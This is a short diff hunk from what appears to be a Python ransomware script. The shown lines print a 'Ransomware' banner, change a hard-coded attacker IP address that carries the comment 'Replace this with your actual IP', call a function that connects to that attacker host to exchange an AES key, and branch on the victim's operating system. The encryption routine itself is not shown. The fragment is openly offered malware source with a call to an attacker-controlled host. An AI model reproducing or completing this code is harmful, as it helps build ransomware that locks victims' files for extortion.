@@ -54,7 +54,7 @@ Encrypted AES Key:
 
 def main():
     print('[*] Ransomware\n')
-    attacker_ip = "192.168.1.186"  # 🔁 Replace this with your actual IP
+    attacker_ip = "192.168.1.187"  # 🔁 Replace this with your actual IP
     key, encrypted_key_b64 = connect_and_exchange_key(attacker_ip)
     plt = platform.system()
     if plt == "Linux" or plt == "Darwin":
